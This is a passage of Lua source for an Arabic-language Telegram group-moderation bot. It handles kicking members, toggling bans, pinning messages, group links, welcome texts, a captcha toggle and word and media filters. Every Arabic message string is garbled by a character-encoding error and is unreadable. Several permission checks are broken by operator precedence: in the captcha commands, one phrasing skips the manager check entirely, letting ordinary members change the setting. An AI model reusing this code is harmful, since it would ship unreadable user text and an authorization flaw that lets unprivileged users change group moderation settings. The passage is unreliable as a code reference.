send(msg.chat_id_, msg.id_, "\nΩ­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― Ψ§Ω Ψ­ΨΈΨ± Ψ§Ω ΩΨͺΩ Ψ§Ω ΨͺΩΩΩΨ― ( "..Get_Rank(userid,msg.chat_id_).." )")
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,"Ω­ ΩΩΨ³ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ­ΨΈΨ± Ψ§ΩΩΨ³ΨͺΨ?Ψ―ΩΩΩ ΩΨ±Ψ¬Ω ΨͺΩΨΉΩΩΩΨ§ !") 
return false 
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end
Kick_Group(msg.chat_id_, userid)
Reply_Status(msg,userid,"reply","Ω­ ΨͺΩ Ψ·Ψ±Ψ―Ω ΩΩ ΩΩΨ§") 
end,nil) 
end
return false
end

if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ·Ψ±Ψ―" or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ­ΨΈΨ±" then
if Creator(msg) then
database:set(bot_id.."Ban:Cheking"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, 'πβΨͺΩ ΨͺΨΉΨ·ΩΩ Β» Ψ§ΩΨ­ΨΈΨ± ~ ΩΨ§ΩΨ·Ψ±Ψ― ')
return false
end
end


if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ·Ψ±Ψ―" or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ­ΨΈΨ±" then
if Creator(msg) then
database:del(bot_id.."Ban:Cheking"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Β» Ψ§ΩΨ­ΨΈΨ± ~ ΩΨ§ΩΨ·Ψ±Ψ― ')
return false
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±ΩΨΉ" or text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±ΩΩΩ" then
if Creator(msg) then
database:set(bot_id.."Add:Group:Cheking"..msg.chat_id_,"true")
send(msg.chat_id_, msg.id_, 'πβΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ±ΩΨΉ Β» Ψ§ΩΨ§Ψ―ΩΩ ~ Ψ§ΩΩΩΩΨ² ')
return false
end
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨ±ΩΨΉ" or text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±ΩΩΩ" then
if Creator(msg) then
database:del(bot_id.."Add:Group:Cheking"..msg.chat_id_)
send(msg.chat_id_, msg.id_, 'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ±ΩΨΉ Β» Ψ§ΩΨ§Ψ―ΩΩ ~ Ψ§ΩΩΩΩΨ² ')
return false
end
end
if text ==("ΨͺΨ«Ψ¨ΩΨͺ") and msg.reply_to_message_id_ ~= 0 and Admin(msg) then 
if database:sismember(bot_id.."Lock:pin",msg.chat_id_) and not Creator(msg) then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
return false 
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100",""),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ") 
database:set(bot_id.."Pin:Id:Msg"..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΨ§ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ") 
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"Ω­ ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ") 
end
end,nil) 
end
if text == "Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ" and Admin(msg) then 
if database:sismember(bot_id.."Lock:pin",msg.chat_id_) and not Creator(msg) then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ") 
return false 
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΨ±Ψ³Ψ§ΩΩ") 
database:del(bot_id.."Pin:Id:Msg"..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΨ§ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ") 
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"Ω­ ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ") 
end
end,nil)
end
if text == 'Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΩΩ' and Admin(msg) then  
if database:sismember(bot_id.."Lock:pin",msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΨͺΩ ΩΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΩΩ")   
https.request('https://api.telegram.org/bot'..token..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
database:del(bot_id.."Pin:Id:Msg"..msg.chat_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨ§ ΩΨ³Ψͺ Ψ§Ψ―ΩΩ ΩΩΨ§ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ Ψ§Ψ―ΩΩ Ψ«Ω Ψ§ΨΉΨ― Ψ§ΩΩΨ­Ψ§ΩΩΩ")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"Ω­ ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ ΩΨ±Ψ¬Ω Ψ§ΩΨͺΨ­ΩΩ ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")  
end
end,nil)
end
if (msg.content_.animation_) or (msg.content_.photo_) or (msg.content_.video_) or (msg.content_.document) or (msg.content_.sticker_) or (msg.content_.voice_) or (msg.content_.audio_) and msg.reply_to_message_id_ == 0 then      
database:sadd(bot_id.."allM"..msg.chat_id_, msg.id_)
end

if text == ("ΨΉΨ―Ψ― Ψ§ΩΩΩΨ―ΩΨ§") and Admin(msg) then  
local gmria = database:scard(bot_id.."allM"..msg.chat_id_)  
send(msg.chat_id_, msg.id_,"Ω­ ΨΉΨ―Ψ― Ψ§ΩΩΩΨ―ΩΨ§ Ψ§ΩΩΩΨ¬ΩΨ― ΩΩ (* "..gmria.." *)")
end
if text and text:match("^ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (%d+)$") and Admin(msg) then 
local Num = text:match("ΩΨΆΨΉ ΨͺΩΨ±Ψ§Ψ± (.*)")
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodmax" ,Num) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨΆΨΉ ΨΉΨ―Ψ― Ψ§ΩΨͺΩΨ±Ψ§Ψ± ("..Num..")") 
end 
if text and text:match("^ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$") and Admin(msg) then 
local Num = text:match("^ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± (%d+)$")
database:hset(bot_id.."flooding:settings:"..msg.chat_id_ ,"floodtime" ,Num) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨΆΨΉ Ψ²ΩΩ Ψ§ΩΨͺΩΨ±Ψ§Ψ± ("..Num..")") 
end
if text == "ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·" or text == 'ΩΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·' then
if msg.reply_to_message_id_ == 0  and Admin(msg) then  
send(msg.chat_id_,msg.id_,"Ω­ Ψ­Ψ³ΩΨ’ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ· Ψ§ΩΨ§Ω")
database:setex(bot_id.."Set:Priovate:Group:Link"..msg.chat_id_..""..msg.sender_user_id_,120,true) 
return false
end
end
if text == "ΨͺΩΨΉΩΩ Ψ±Ψ§Ψ¨Ψ·" or text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
if Admin(msg) then  
database:set(bot_id.."Link_Group:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·") 
return false  
end
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ±Ψ§Ψ¨Ψ·" or text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
if Admin(msg) then  
database:del(bot_id.."Link_Group:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ±Ψ§Ψ¨Ψ·") 
return false end
end
if text == "Ψ§ΩΨ±Ψ§Ψ¨Ψ·" then 
local status_Link = database:get(bot_id.."Link_Group:status"..msg.chat_id_)
if not status_Link then
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ±Ψ§Ψ¨Ψ· ΩΨΉΨ·Ω") 
return false  
end
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
local link = database:get(bot_id.."Private:Group:Link"..msg.chat_id_)            
if link then                              
local Text =[[
Group Link
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..ta.title_..'', url = ''..link..''},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else                
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
linkgp = 'Ω­ π»πΈπ½πΊ πΆππΎππΏ.\nβ β β β β β β β\n ['..ta.title_..']('..linkgpp.result..')'
else
linkgp = 'Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ§Ψ¨Ψ· Ψ§Ψ±Ψ³Ω ΨΆΨΉ Ψ±Ψ§Ψ¨Ψ·'
end  
local Text =[[
Group Link
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..ta.title_..'', url = ''..linkgpp.result..''},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end   
end,nil)
end
if text == 'ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩ' or text == 'ΨͺΩΨΉΩΩ ΨͺΨ­ΩΩ' and Manger(msg) then   
if database:get(bot_id.."Chek:Welcome"..msg.chat_id_) then
database:del(bot_id.."Chek:Welcome"..msg.chat_id_)
end
if not database:get(bot_id..'CAPTCHA'..msg.chat_id_) then
database:set(bot_id.."CAPTCHA"..msg.chat_id_,true) 
Text = ' *Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩ ΨΉΩΨ― Ψ―Ψ?ΩΩ Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘*'
else
Text = ' *Ω­ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ­ΩΩ*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩ' or text == 'ΨͺΨΉΨ·ΩΩ ΨͺΨ­ΩΩ' and Manger(msg) then  
if not database:get(bot_id..'CAPTCHA'..msg.chat_id_) then
Text = '\n *Ω­ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩ*'
else
database:del(bot_id.."CAPTCHA"..msg.chat_id_) 
Text = '\n *Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ­ΩΩ ΨΉΩΨ― Ψ―Ψ?ΩΩ Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΩΨ³Ψ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·' or text == 'Ψ­Ψ°Ω Ψ§ΩΨ±Ψ§Ψ¨Ψ·' then
if Admin(msg) then     
send(msg.chat_id_,msg.id_," π‘ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ§Ψ¨Ψ·")           
database:del(bot_id.."Private:Group:Link"..msg.chat_id_) 
return false      
end
end
if text and text:match("^ΨΆΨΉ Ψ΅ΩΨ±Ω") and Admin(msg) and msg.reply_to_message_id_ == 0 or text and text:match("^ΩΨΆΨΉ Ψ΅ΩΨ±Ω") and Admin(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."Change:Chat:Photo"..msg.chat_id_..":"..msg.sender_user_id_,true) 
send(msg.chat_id_, msg.id_,"πβΨ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ΅ΩΨ±Ω") 
return false
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ΅ΩΨ±Ω" or text == "ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ±Ω" then 
if Admin(msg) then
https.request("https://api.telegram.org/bot"..token.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ΅ΩΨ±Ψ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
return false 
end
if text == "ΨΆΨΉ ΩΨ΅Ω" or text == "ΩΨΆΨΉ ΩΨ΅Ω" then 
if Admin(msg) then
database:setex(bot_id.."Set:Description" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true) 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§Ω Ψ§ΩΩΨ΅Ω")
end
return false 
end
if text == "ΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨" or text == "ΩΨΆΨΉ ΨͺΨ±Ψ­ΩΨ¨" then 
if Admin(msg) then
database:setex(bot_id.."Welcome:Group" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true) 
t = "Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ§Ω"
tt = "\nΩ­ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© ΩΨ§ΩΩΩ !\nΩ­ Ψ―Ψ§ΩΨ© ΨΉΨ±ΨΆ Ψ§ΩΨ§Ψ³Ω Β»{`name`}\nΩ­ Ψ―Ψ§ΩΨ© ΨΉΨ±ΨΆ Ψ§ΩΩΨΉΨ±Ω Β»{`user`}"
send(msg.chat_id_, msg.id_,t..tt) 
end
return false 
end
if text == "Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" and Admin(msg) then 
if database:get(bot_id.."Get:Welcome:Group"..msg.chat_id_) then 
Welcome = database:get(bot_id.."Get:Welcome:Group"..msg.chat_id_) 
else 
Welcome = "Ω­ ΩΩ ΩΨͺΩ ΨͺΨΉΩΩΩ ΨͺΨ±Ψ­ΩΨ¨ ΩΩΩΨ¬ΩΩΨΉΩ"
end 
send(msg.chat_id_, msg.id_,"["..Welcome.."]") 
return false 
end
if text == "ΨͺΩΨΉΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" and Admin(msg) then 
database:set(bot_id.."Chek:Welcome"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΩΨΉΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false 
end
if text == "ΨͺΨΉΨ·ΩΩ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" and Admin(msg) then 
database:del(bot_id.."Chek:Welcome"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
return false 
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" or text == "Ψ­Ψ°Ω Ψ§ΩΨͺΨ±Ψ­ΩΨ¨" then 
if Admin(msg) then
database:del(bot_id.."Get:Welcome:Group"..msg.chat_id_) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
return false 
end
if text and text == "ΩΩΨΉ" and msg.reply_to_message_id_ == 0 and Manger(msg)  then       
send(msg.chat_id_, msg.id_," *Ω­Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ ΩΩΩΨΉΩΨ§*")  
database:set(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," *Ω­Ψ§Ψ±Ψ³Ω Ψ§ΩΨͺΨ­Ψ°ΩΨ± ΨΉΩΨ― Ψ§Ψ±Ψ³Ψ§Ω Ψ§ΩΩΩΩΩ*")  
database:set(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."Mahmoud1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."Mahmoud1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," *Ω­ΨͺΩ ΩΩΨΉ Ψ§ΩΩΩΩΩ ΩΨΉ Ψ§ΩΨͺΨ­Ψ°ΩΨ±*")  
database:del(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."Mahmoud1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."Mahmoud1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."Mahmoud1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ" and msg.reply_to_message_id_ == 0 and Manger(msg) then    
send(msg.chat_id_, msg.id_," *Ω­Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨ§Ω*")  
database:set(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_," *Ω­ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉΩΨ§*")  
database:del(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Mahmoud1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."Mahmoud1:List:Filter"..msg.chat_id_,text)  
return false  end  
end


if text == 'ΩΩΨΉ' and tonumber(msg.reply_to_message_id_) > 0 and Manger(msg) then     
function cb(a,b,c) 
textt = ' *Ω­ΨͺΩ ΩΩΨΉ* '
if b.content_.ID == 'MessageSticker' then    
local idsticker = b.content_.sticker_.sticker_.persistent_id_
database:sadd(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'Ψ§ΩΩΩΨ΅Ω'
send(msg.chat_id_, msg.id_,textt..'*( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§*')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.sizes_[1].photo_.persistent_id_
database:sadd(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'Ψ§ΩΨ΅ΩΨ±Ω'
send(msg.chat_id_, msg.id_,textt..'*( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§*')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:sadd(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'Ψ§ΩΩΨͺΨ­Ψ±ΩΩ'
send(msg.chat_id_, msg.id_,textt..'*( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩ ΩΨͺΩ Ψ§Ψ±Ψ³Ψ§ΩΩΨ§ ΩΨ¬Ψ―Ψ―Ψ§*')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == 'Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ' and tonumber(msg.reply_to_message_id_) > 0 and Manger(msg) then     
function cb(a,b,c) 
textt = ' *Ω­ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ ΩΩΨΉ* '
if b.content_.sticker_ then
local idsticker = b.content_.sticker_.sticker_.persistent_id_
database:srem(bot_id.."filtersteckr"..msg.chat_id_,idsticker)
text = 'Ψ§ΩΩΩΨ΅Ω'
send(msg.chat_id_, msg.id_,textt..'*( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩΩΩΩΩ Ψ§ΩΨ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ§Ω*')  
return false
end
if b.content_.ID == "MessagePhoto" then
local photo = b.content_.photo_.sizes_[1].photo_.persistent_id_
database:srem(bot_id.."filterphoto"..msg.chat_id_,photo)
text = 'Ψ§ΩΨ΅ΩΨ±Ω'
send(msg.chat_id_, msg.id_,textt..'*( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩΩΩΩΩ Ψ§ΩΨ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ§Ω*')  
return false
end
if b.content_.animation_.animation_ then
local idanimation = b.content_.animation_.animation_.persistent_id_
database:srem(bot_id.."filteranimation"..msg.chat_id_,idanimation)
text = 'Ψ§ΩΩΨͺΨ­Ψ±ΩΩ'
send(msg.chat_id_, msg.id_,textt..'*( '..text..' ) Ψ¨ΩΨ¬Ψ§Ψ­ ΩΩΩΩΩΩ Ψ§ΩΨ§Ψ±Ψ³Ψ§Ω Ψ§ΩΨ§Ω*')  
return false
end
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, cb, nil)
end
if text == "ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ"and Manger(msg) then   
local list = database:smembers(bot_id.."Mahmoud1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."Mahmoud1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."Mahmoud1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."Mahmoud1:List:Filter"..msg.chat_id_,v)  
end  
send(msg.chat_id_, msg.id_," *Ω­ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ*")  
end
if text == "ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ" and Manger(msg) then   
tdcli_function ({ID = "GetUser",user_id_ = bot_id},function(arg,data) 
local Text = "\n *Ω­ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨΉ* \n*Ω΄β β β β β β β β β β β β β β*\n"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Ψ΅ΩΨ±', url="https://t.me/"..data.username_.."?start=ph"..msg.chat_id_},{text = 'ΩΩΩΨ§Ψͺ', url="https://t.me/"..data.username_.."?start=msg"..msg.chat_id_}},
{{text = 'ΩΨͺΨ­Ψ±ΩΨ§Ψͺ', url="https://t.me/"..data.username_.."?start=gif"..msg.chat_id_},{text = 'ΩΩΨ΅ΩΨ§Ψͺ', url="https://t.me/"..data.username_.."?start=Sti"..msg.chat_id_}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if text == "ΨͺΨ­ΩΩ" and Manger(msg) then   
tdcli_function ({ID = "GetUser",user_id_ = bot_id},function(arg,data) 
local Text = "Ψ§ΨΆΨΊΨ· ΨΉΩΩ Ψ§Ψ­Ψ― Ψ§ΩΨ§Ψ²Ψ±Ψ§Ψ± ΩΩΨͺΨ­ΩΩ Ω Ψ§ΩΨ±ΩΩ ΩΩ Ψ?Ψ§Ψ΅ Ψ§ΩΨ¨ΩΨͺ"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΩΩ', url="https://t.me/"..data.username_.."?start=tth"..msg.chat_id_},{text = 'Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨΉΨ·ΩΩ', url="https://t.me/"..data.username_.."?start=qff"..msg.chat_id_}},
{{text = 'ΨͺΨ­ΩΩ Ψ§ΩΨ±ΨͺΨ¨', url="https://t.me/"..data.username_.."?start=kkh"..msg.chat_id_}},
}
local msg_id = msg.id_/2097152/0.5
